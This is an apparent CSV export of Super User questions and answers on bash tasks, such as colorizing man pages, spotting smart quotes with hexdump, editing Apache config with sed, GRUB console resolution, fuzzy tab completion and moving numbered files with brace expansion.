Title,Id,Tags,Score,Body
"bash: colorized man page","452034","<bash><shell><colors><pager><man>","15","<pre><code>export LESS_TERMCAP_md=$'\E[0;33;5;74m'  # begin bold
export LESS_TERMCAP_us=$'\E[0;36;5;146m' # begin underline
</code></pre>

<p>In these two cases, all the colors and attributes are reset (0), the foreground color is switched to yellow/brown (33) or cyan (36), then blinking is turned on (5), and then something else also happens (74 or 146) which are probably undefined and not desired.</p>

<pre><code>export LESS_TERMCAP_so=$'\E[38;5;246m'
</code></pre>

<p>This one's different, because 38 takes additional numeric parameters. It stands for extended foreground color (and similarly 48 would be the same for background), and if followed by a 5 as the next parameter (which doesn't have anything to do with blinking this time) the third number specifies the color's index (from 0 to 255: 16 standard legacy colors, followed by a 6x6x6 RGB cube, followed by 24 grayscale colors), see e.g. <a href=""http://www.calmar.ws/vim/256-xterm-24bit-rgb-color-chart.html"" rel=""nofollow noreferrer"">here</a>.</p>

<p>Certain terminal emulators also support direct arbitrary RGB colors, in that case 38 should be followed by 2, and then by three decimal numbers in the 0-255 range for R, G, B respectively, e.g. #BADA55 is</p>

<pre><code>\E[38;2;186;218;85m
</code></pre>
"
"How can I check the verbatim characters of a bash command string?","1323144","<linux><bash><gnome-terminal>","15","<p>One option is to look at the characters you're trying to use with a hex viewer or editor. <code>hexdump</code> is a good option if you are limited to the terminal.</p>

<pre><code>$ hexdump -Cv &lt;&lt;""EOF""
&gt; [ -f /etc/openvpn/client.conf ] &amp;&amp; echo true
&gt; EOF
00000000  5b 20 2d 66 20 2f 65 74  63 2f 6f 70 65 6e 76 70  |[ -f /etc/openvp|
00000010  6e 2f 63 6c 69 65 6e 74  2e 63 6f 6e 66 20 5d 20  |n/client.conf ] |
00000020  26 26 20 65 63 68 6f 20  74 72 75 65 0a           |&amp;&amp; echo true.|
0000002d
</code></pre>

<p>You can see here that the <code>space</code>, <code>close-square-brace</code>, <code>space</code> are correct - <code>0x20</code>, <code>0x5D</code>, <code>0x20</code>.</p>

<p>These values are ASCII codes, displayed in <a href=""https://en.wikipedia.org/wiki/Hexadecimal"" rel=""noreferrer"">hexadecimal</a>. Any value outside the range <code>0x20</code> - <code>0x7E</code> is not a <a href=""https://en.wikipedia.org/wiki/ASCII#Printable_characters"" rel=""noreferrer"">""<em>printable character</em>""</a> as far as ASCII is concerned, and most likely won't play well with command line interfaces.</p>

<p><em>Note:</em> I copied your first ""<em>broken</em>"" line for use in the <code>hexdump</code> example above, so something has replaced the <em>not-an-ASCII-space</em> with an ASCII space between your original source and your rendered question.</p>

<hr>

<p>To repeat this, take the following steps:</p>

<ol>
<li>Type <code>hexdump -Cv &lt;&lt;""EOF""</code> and press <kbd>Enter</kbd></li>
<li>Paste the text you would like to use</li>
<li>Type <code>EOF</code> on a line of its own, and press <kbd>Enter</kbd></li>
</ol>

<hr>

<p>Terminals and Command Line Interfaces don't handle special characters well - as you have discovered. If you aren't very careful with formatting documents, you will also have problems with Microsoft Word (and others) using ""<em>smart quotes</em>"", em-dashes, the list goes on...</p>

<p>Spot the difference: (the top is ""<em>smart quotes</em>"", the bottom is ""<em>straight quotes</em>"")</p>

<p><img src=""https://i.stack.imgur.com/hZFjw.png"" alt=""example of smart quotes vs straight quotes""></p>

<pre><code>$ hexdump -Cv &lt;&lt;""EOF""
&gt; “quoted string”
&gt; EOF
00000000  e2 80 9c 71 75 6f 74 65  64 20 73 74 72 69 6e 67  |...quoted string|
00000010  e2 80 9d 0a                                       |....|
00000014
</code></pre>

<p>Here, the open quotes are not a simple ASCII quote (<code>""</code>), but are a Unicode / <a href=""https://en.wikipedia.org/wiki/UTF-8"" rel=""noreferrer"">UTF-8</a> series - <code>0xE2</code>, <code>0x80</code>, <code>0x9C</code>, or <a href=""https://en.wikipedia.org/wiki/List_of_Unicode_characters#Unicode_symbols"" rel=""noreferrer""><code>U+201C</code></a> - which the terminal will not handle as you might expect.</p>

<p>Kiwy's suggestion of <code>cat -A</code> also does the job:</p>

<pre><code>$ cat -A &lt;&lt;""EOF""
&gt; “quoted string”
&gt; EOF
M-bM-^@M-^\quoted stringM-bM-^@M-^]$
</code></pre>

<hr>

<p><strong><em>Note:</em></strong> when using <code>echo ""..."" | hd</code>, you stand a chance that bash will substitute parts of the string you are trying to inspect. This is particularly of concern when trying to inspect components of a script.</p>

<p>For example try:</p>

<pre><code>$ echo ""${USER}""
attie

$ echo ""`whoami`""
attie

$ echo ""$(whoami)""
attie

$ cat &lt;&lt;EOF
&gt; ${USER}
&gt; EOF
attie
</code></pre>

<p>These methods are replacing components with the relevant text. To avoid this, use one of the following approaches. Note the use of single quotes (<code>'</code>), and a <a href=""https://en.wikipedia.org/wiki/Here_document"" rel=""noreferrer"">""<em>quoted heredoc</em>""</a> (<code>""EOF""</code>).</p>

<pre><code>$ echo '${USER}'
${USER}

$ echo '`whoami`'
`whoami`

$ echo '$(whoami)'
$(whoami)

$ cat &lt;&lt;""EOF""
&gt; ${USER}
&gt; EOF
${USER}
</code></pre>
"
"Using sed to enable .htaccess files in Apache config","645799","<linux><ubuntu><bash><apache-http-server><sed>","15","<p><code>sed</code> supports pattern ranges in this form:</p>

<pre><code>sed '/startpattern/,/endpattern/ &lt;sed-commands&gt;' file
</code></pre>

<p>For example:</p>

<pre><code>sed '/&lt;Directory \/var\/www\/&gt;/,/&lt;\/Directory&gt;/ s/AllowOverride None/AllowOverride all/' httpd.conf
</code></pre>
"
"No bashrc file in my home directory","584540","<bash><bashrc>","15","<p>Don't forget it is a hidden file inside your home directory (you would not be the first to do a <code>ls -l</code> and thinking it is not there).</p>

<p>Do following ...</p>

<pre><code>ls -la ~/ | more
</code></pre>

<p>There should be a <code>.bashrc</code> on the first page. If not just create it with</p>

<pre><code>vi ~/.bashrc
</code></pre>

<p>And simply write following line into it.</p>

<pre><code>PATH=$PATH:~/bin
</code></pre>

<hr>

<p><strong>OR</strong>
Most of the distributions keep a standard <code>.bashrc</code> file in <code>/etc/skel/</code> You can copy it to home directory.</p>

<pre><code>$cp /etc/skel/.bashrc ~
</code></pre>
"
"No such file or directory after typing $PATH in terminal","881463","<linux><bash><path>","15","<p><code>$PATH</code> is a variable, which I am sure you're aware of. When that variable is resolved, it would be the same as typing in <code>:/home/bo/bin:/usr/local/bin:/usr/sbin:/usr/local/sbin:/usr/bin:/sbin:/bin:</code> and expecting something to happen. The reason <code>echo $PATH</code> works is because you're explicitly piping it out to the display rather than telling the terminal to ""do"" <code>$PATH</code>.</p>
"
"Are there other commands like scp but for deleting files and folders?","652837","<bash><ssh><scp>","15","<p>The <a href=""http://www.linuxmanpages.com/man1/ssh.1.php""><code>ssh</code></a> command will allow you to execute pretty much any command on the remote host, e.g.,</p>

<pre><code>ssh yourlogin@remotehost rmdir somedir
</code></pre>

<p>where in this example <code>somedir</code> is relative to the home directory of yourlogin.</p>
"
"How to change the resolution of the Bash for a Debian VM?","598374","<linux><bash>","15","<p>What you basically want to do is change the resolution of the <a href=""http://en.wikipedia.org/wiki/Framebuffer"" rel=""noreferrer"">framebuffer</a>. Here's the process I used (supposing that your desired resolution is 1024x768, and that Hyper-V's framebuffer supports this resolution):</p>

<ol>
<li>Open up <code>/etc/default/grub</code> with superuser privileges: <code>sudo nano /etc/default/grub</code></li>
<li>Uncomment/add the following lines:

<blockquote>
  <p>GRUB_GFXMODE=1024x768x32<br>
  GRUB_GFXPAYLOAD_LINUX=keep</p>
</blockquote></li>
<li>Save the file and exit: <kbd>Ctrl</kbd>-<kbd>O</kbd>, <kbd>Enter</kbd>, <kbd>Ctrl</kbd>-<kbd>X</kbd></li>
<li>Run <code>update-grub</code> as superuser: <code>sudo update-grub</code></li>
<li>Reboot, and (hopefully) enjoy a higher-resolution console!</li>
</ol>
"
"How to automatically execute a shell script when logging into Ubuntu","299394","<bash><gnome><ubuntu-11.04><.bash-profile>","15","<p>You could simply add the following command into System > Preferences > Startup Applications:</p>

<pre><code>bash /full/path/to/your/script.sh
</code></pre>

<p>That should do the trick ;)</p>
"
"How can I get Mac OS X's proxy information in a Bash script?","48480","<macos><bash><terminal><proxy>","15","<p>The following seems to work, but I'm not sure how robust it is:</p>

<pre><code>system_profiler SPNetworkDataType|grep ""HTTP Proxy Server""|awk {'sub(/^.*:[ \t]*/, """", $0); print $0;'}
</code></pre>

<p>It doesn't work if your Location uses a <code>proxy.pac</code> instead of a hard-coded proxy location.</p>
"
"Is there a shell which supports fuzzy completion as in Sublime Text?","561451","<bash><shell><tab-completion>","15","<p>I know of <a href=""https://github.com/mgalgs/fuzzy_bash_completion"" rel=""nofollow noreferrer"">https://github.com/mgalgs/fuzzy_bash_completion</a> which is a bunch of shell functions used with <code>complete</code>.</p>

<p>I think we could probably do a little better though, be more concise. Time to bust open your .bashrc or .profile...</p>

<p>The basic hook we use is this:</p>

<p><code>complete -o nospace -o filenames -F fuzzypath cd ls cat</code></p>

<p>-F option means use a shell function for the tab-completion, where the options are set in the <code>COMPREPLY</code> variable. So for example:</p>

<pre>
function fuzzypath() {
    if [ -z $2 ] 
    then
        COMPREPLY=( `ls` )
    else
        DIRPATH=`echo ""$2"" | gsed 's|[^/]*$||'`
        BASENAME=`echo ""$2"" | gsed 's|.*/||'`
        FILTER=`echo ""$BASENAME"" | gsed 's|.|\0.*|g'`
        COMPREPLY=( `ls $DIRPATH | grep -i ""$FILTER"" | gsed ""s|^|$DIRPATH|g""` )
    fi
}
</pre>

<p>where <code>DIRPATH</code> is everything before the last / on your path that you're typing and <code>BASENAME</code> is where your cursor is currently. </p>

<p><code>FILTER</code> is where the fuzzy-ness comes in. Basically, take <code>BASENAME</code> and insert a <code>.*</code> between every char to produce our fuzz regex.</p>

<p>The rest is just combining the regex with ls to produce <code>COMPREPLY</code>. You may find more clever things to do here, maybe with <code>find</code>.</p>

<p>I also found <a href=""http://fahdshariff.blogspot.com/2011/04/writing-your-own-bash-completion.html"" rel=""nofollow noreferrer"">http://fahdshariff.blogspot.com/2011/04/writing-your-own-bash-completion.html</a> to be useful.</p>
"
"Move a range of numbered files?","380338","<linux><bash><mv>","15","<p>Since you said it's not always exactly 21 files than you need to move the files manually, and to do that effectively you could use <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Brace-Expansion"" rel=""noreferrer""><strong>brace expansion</strong></a>:</p>

<pre><code>mv filename{001..21} dir1
mv filename{022..53} dir2
...
</code></pre>
"
